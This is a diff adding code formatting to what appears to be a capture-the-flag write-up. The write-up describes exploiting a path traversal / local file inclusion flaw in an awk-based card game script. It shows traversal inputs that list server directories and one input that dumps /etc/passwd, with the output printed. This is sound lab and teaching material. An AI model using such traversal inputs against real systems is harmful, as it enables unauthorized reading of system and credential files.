@@ -14,12 +14,15 @@ A LOT of trial and error lead me to find the first exploit - Local File Inclusio
 
 changing the input from
 
-8 AM 0310 BlackJack 
+```sh
+8 AM 0310 BlackJack
+```
 to
-
+```sh
 8 ../../../ ../../../../ BlackJack
+```
 outputs the names of directories on the machine
-
+```sh
 ~#5 ../../../../../../ ../../../../../../../ TexasHoldEm 
 ~~~~~~~~~~~~~~~~~~~~~~~
 awk: warning: command line argument `../../../../../../../03-instructor' is a directory: skipped
@@ -34,8 +37,11 @@ awk: warning: command line argument `../../../../../../../etc' is a directory: s
 awk: script2.awk:4: warning: command line argument `../../../../../../../git-ctf' is a directory: skipped
 awk: script2.awk:4: warning: command line argument `../../../../../../../home' is a directory: skipped
 awk: script2.awk:4: warning: command line argument `../../../../../../../home1' is a directory: skipped
+```
+
 This was an exciting discovery but I wanted to be more specific and eventually narrowed it down to dump the /etc/passwd file by grepping x and : and specifying the path to the file
 
+```sh
 ~#x : /etc/passwd Roulette
 ~~~~~~~~~~~~~~~~~~~~~~~
 root:x:0:0:root:/root:/bin/bash   
@@ -62,3 +68,4 @@ syslog:x:102:106::/home/syslog:/usr/sbin/nologin
 messagebus:x:103:107::/nonexistent:/usr/sbin/nologin   
 _apt:x:104:65534::/nonexistent:/usr/sbin/nologin   
 uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin   
+```
